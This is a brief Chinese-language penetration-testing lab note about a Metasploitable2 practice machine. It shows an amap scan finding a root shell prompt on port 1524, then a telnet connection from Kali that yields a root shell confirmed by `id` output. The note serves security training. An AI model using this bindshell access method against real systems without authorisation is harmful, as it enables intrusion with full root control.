## Telnet后门

0、使用amap扫描，里面有这么一条信息

Unrecognized response from 192.168.199.169:1524/tcp (by trigger http) received.
Please send this output and the name of the application to vh@thc.org:
0000:  726f 6f74 406d 6574 6173 706c 6f69 7461    [ root@metasploita ]
0010:  626c 653a 2f23 20                          [ ble:/#           ]

我去一个tcp连接 通过http触发,还能用浏览器访问这个端口

```bash
#直接使用
[root@kali: ~#] telnet metasploitable2 1524 
root@metasploitable:/# root@metasploitable:/# id
uid=0(root) gid=0(root) groups=0(root)
```
